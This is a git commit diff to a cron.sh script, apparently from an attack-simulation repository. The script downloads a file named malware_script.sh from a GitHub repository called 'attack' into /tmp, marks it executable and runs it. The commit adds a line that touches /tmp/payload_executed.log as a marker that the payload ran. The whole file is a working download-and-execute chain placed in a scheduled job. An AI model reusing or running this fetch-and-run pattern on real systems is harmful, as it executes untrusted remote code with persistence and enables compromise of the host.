7e0a7b7c94a1583c676c00625fb9eac0f0188475
raghul-simbian <raghul.v@simbian.ai>
2025-07-06 20:05:30 +0530

    Update cron.sh

--- cron.sh
+++ cron.sh
@@ -2,3 +2,4 @@
 curl -o /tmp/malware_script.sh https://raw.githubusercontent.com/raghul-simbian/attack/main/malware_script.sh
 chmod +x /tmp/malware_script.sh
 /tmp/malware_script.sh
+touch /tmp/payload_executed.log
